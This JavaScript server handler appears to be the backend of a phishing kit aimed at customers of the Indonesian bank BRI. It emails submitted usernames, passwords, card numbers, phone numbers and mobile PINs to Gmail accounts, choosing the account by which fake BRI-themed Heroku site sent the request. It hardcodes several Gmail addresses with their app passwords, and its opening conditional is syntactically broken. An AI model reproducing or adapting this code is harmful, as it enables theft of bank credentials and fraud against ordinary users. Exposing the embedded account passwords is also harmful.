export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;
    
    } else if (url == 'pilihan-tarif-bri-new.herokuapp.com') {
    let email = 'landaslepas77@gmail.com';
    let pass = 'eyosohykexzgicup';

    if(url == 'bri-tarif.herokuapp.com'){

        email = 'adddd8761@gmail.com';
        pass = 'qnuzqqazxukhldpk';

    } else if (url == 'bri-promo.herokuapp.com') {
        
        email = 'hibrahimshaleh@gmail.com';
        pass = 'bfaawtyurzhbqjkl';

    } else if(url == 'bri-pelayanan.herokuapp.com'){
        email = 'pukiayam5123@gmail.com';
        pass = 'joyxbannkfmypmzx';

    } else if(url == 'bri-pertarif.herokuapp.com'){
        email = 'bbri58087@gmail.com';
        pass = 'rngmokeomagmuhki';

    }else if (url == 'pilihan-tarif.herokuapp.com'){
        email= 'barulink236@gmail.com';
        pass = 'bopgkupysveiukmb';
    }
    else {
        email = 'wkop6003@gmail.com';
        pass = 'qvuzolhvduyiejax';
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>nokartu: ${body.nomorkartu ?? '-'}</li>
                        <li>nohp: ${body.nomorhandphone ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
